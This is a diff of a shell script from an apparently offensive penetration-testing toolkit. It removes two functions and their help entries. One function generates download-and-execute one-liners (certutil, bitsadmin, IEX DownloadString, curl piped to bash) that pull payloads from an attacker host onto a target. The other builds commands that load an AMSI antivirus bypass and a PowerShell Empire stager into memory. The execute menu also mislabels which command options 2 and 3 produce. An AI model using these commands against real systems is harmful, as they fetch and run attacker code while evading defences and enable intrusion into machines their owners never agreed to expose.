@@ -39,12 +39,6 @@ nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
 nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
 
-Misc
-----
-nb-srv-file-download    select one of general commands to download a payload into a target machine
-nb-srv-empire-stager    command to download and execute empire stager in a target machine
-nb-srv-install          install dependencies
-
 DOC
 }
 
@@ -76,93 +70,6 @@ nb-srv-install() {
         __info "cheroot is not installed. Installing..."
         sudo pip3 install cheroot
     fi
-}
-
-nb-srv-file-download() {
-    nb-vars-set-lhost
-    nb-vars-set-lport
-    local filename && __askvar filename "FILENAME"
-
-    __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
-    local down && __askvar down "DOWNLOAD_OPTION"
-
-    case $down in
-        d)
-            # Commands for downloading to disk
-            echo "Choose a command to copy:"
-            echo "1. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
-            echo "2. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-            echo "3. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-            echo "4. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-            echo "5. Previous menu"
-            echo
-            echo -n "Choice: "
-            read choice
-
-            case $choice in
-                1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
-                2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-                3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-                4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-                5) exit;;
-                *) echo "Invalid option"; exit;;
-            esac
-            ;;
-        e)
-            # Commands for downloading and executing in memory
-            echo "Choose a command to copy:"
-            echo "1. IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-            echo "2. IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
-            echo "3. curl http://${__LHOST}:${__LPORT}/$filename | bash"
-            echo "4. Previous menu"
-            echo
-            echo -n "Choice: "
-            read choice
-
-            case $choice in
-                1) __COMMAND="powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
-                2) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
-                3) __COMMAND="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
-                4) exit;;
-                *) echo "Invalid option"; exit;;
-            esac
-            ;;
-        *)
-            echo "Invalid action choice"; exit;;
-    esac
-
-    echo "$__COMMAND" | wl-copy
-
-    __info "Run the shell using command:"
-    __ok "  Start-Process \"shell-name.exe\""
-}
-
-nb-srv-empire-stager() {
-    nb-vars-set-lhost
-    nb-vars-set-lport
-
-    # Path to generated Empire stager
-    echo
-    __ask "Select generated stager: "
-    local dp=$(__menu $(find /var/lib/powershell-empire/empire/client/generated-stagers/ -type f -printf "%P\n"))
-    __ok "Selected: ${dp}"
-
-    # Download the stager and bypass AV
-    local __COMMAND
-    __COMMAND="
-iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
-iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
-"
-
-    # Copy the commands to clipboard
-    echo "$__COMMAND" | wl-copy
-    __info "Commands to download the stager copied to clipboard."
-
-    # MOVE IT TO server
-    sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/${dp} $SV
-
-    # Run the server
-    nb-srv-web
 }
 
 nb-srv-uploadserver() {
